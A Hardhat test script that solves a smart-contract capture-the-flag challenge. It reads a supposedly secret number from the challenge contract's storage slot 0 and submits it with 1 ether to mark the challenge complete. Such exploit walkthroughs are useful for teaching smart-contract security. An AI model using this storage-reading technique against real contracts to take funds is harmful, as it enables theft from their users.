import crypto from "crypto";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { expect } from "chai";
import { formatEtherscanTx } from "../utils/format";

let accounts: Signer[];
let eoa: Signer;
let contract: Contract; // challenge contract

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory("GuessTheRandomNumberChallenge");
  contract = factory.attach(`0x186a8b89Ed6451103b11ECcC30540C440108334f`);
});

it("solves the challenge", async function () {
  // read number from contract state, everything is public on blockchain
  const number = BigNumber.from(await contract.provider.getStorageAt(contract.address, 0))
  console.log(`Secret number was ${number}`)
  const tx = await contract.guess(number, {
    value: ethers.utils.parseEther(`1`),
  });
  const txHash = tx && tx.hash;
  console.log(formatEtherscanTx(txHash));

  const isComplete = await contract.isComplete()
  expect(isComplete).to.be.true;
});
